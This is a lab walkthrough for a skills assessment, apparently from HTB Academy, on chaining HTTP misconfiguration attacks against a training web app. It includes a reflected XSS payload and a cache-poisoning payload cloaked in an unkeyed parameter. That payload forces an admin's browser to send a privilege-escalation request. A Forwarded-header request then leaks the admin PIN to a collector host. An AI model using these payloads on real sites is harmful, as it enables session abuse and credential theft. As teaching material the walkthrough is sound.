# Skills Assessment - Hard

This section outlines a comprehensive skills assessment for the "Abusing HTTP Misconfigurations" module, requiring students to chain multiple attack vectors including web cache poisoning via parameter cloaking and password reset poisoning to gain full access to the admin panel.

## Walkthrough

### Initial Reconnaissance

After logging in with the credentials `htb-stdnt:Academy_student!` via the Backend Portal, students need to gather intelligence about the web application.

The first important discovery is identifying the web framework. When inspecting the response headers of the request to `/admin/index.html`, students will find the custom header `X-Powered-By` exposes the framework to be Python Bottle, version 0.12.18. This version is vulnerable to CVE-2020-28473, making parameter cloaking a viable attack technique.

Additionally, students should notice the `X-Cache-Status` header, which indicates whether responses are cached (`MISS` for the first request, `HIT` for subsequent identical requests).

### Identifying Unkeyed Parameters

When testing different parameters, students need to identify that `utm_source` is an unkeyed parameter. This can be confirmed by changing the value of `utm_source` while observing that the `X-Cache-Status` remains `HIT`, indicating the same cached response is being served.

### Understanding the Attack Surface

By navigating to the "Users" section, students will discover that the admin frequently visits the link `httpattacks.htb:STMPO/admin/users.html?sort_by=role`. This is a critical piece of information for cache poisoning exploitation.

To promote the `htb-stdnt` user to admin privileges, the admin must be coerced into accessing `httpattacks.htb:STMPO/admin/promote?uid=2`, which is only authorized for admin users.

### Exploiting Reflective XSS via Parameter Cloaking

Students need to test if the `sort_by` parameter suffers from reflective XSS. By examining how its value is used (as an argument to the `sort_table_by` function), students can craft a payload that breaks out of the context and injects JavaScript.

The payload structure requires extensive trial and error to achieve valid JavaScript syntax:

```javascript
doesNotMatter")</script><script>alert("XSS Success");doesNotMatter=("
```

After URL-encoding all special characters:

```javascript
doesNotMatter%22%29%3C%2Fscript%3E%3Cscript%3Ealert%28%22XSS%20Success%22%29%3BdoesNotMatter%3D%28%22
```

### Cache Poisoning with Parameter Cloaking

Students need to combine the gathered intelligence to poison the cache for the admin user. Since Bottle (vulnerable to CVE-2020-28473) treats semicolons as parameter separators, students can exploit parameter cloaking by "hiding" the malicious `sort_by` parameter within the unkeyed `utm_source` parameter.

The final payload uses `sort_by=role` (the keyed parameter that the admin expects) and appends the cloaked malicious `sort_by` parameter within `utm_source`:

```javascript
sort_by=role&utm_source=index.html;sort_by=doesNotMatter")</script><script>var xhr = new XMLHttpRequest();xhr.open('GET', '/admin/promote?uid=2', true);xhr.withCredentials = true;xhr.send();doesNotMatter=("
```

After URL-encoding all special characters and sending the request, the cache should be poisoned. When the admin visits the page, the XSS payload will execute, promoting the `htb-stdnt` user to admin.

### Password Reset Poisoning for PIN Exfiltration

After gaining admin privileges, students need to access `/admin/sysinfo`. The page instructs admins to access `httpattacks:STMPO/admin/sysinfo?refresh=1` and requires a PIN to access the admin panel.

Students need to test if the web application is vulnerable to password reset poisoning by checking if it uses the `Host` header to construct absolute links in the form action. While the `Host` header manipulation does reflect in the response, checking the logs at `http://interactsh.local:STMPO/log` will reveal no PIN is received.

Instead, students need to use the `Forwarded` Override Header with the value `interactsh.local`:

```http
GET /admin/sysinfo?refresh=1 HTTP/1.1
Host: httpattacks.htb
Forwarded: interactsh.local
```

After waiting a few seconds, the admin will submit the PIN, which can be retrieved from the logs at `http://interactsh.local:STMPO/log`.

Students can then use the PIN to access the admin panel and retrieve the sensitive information.


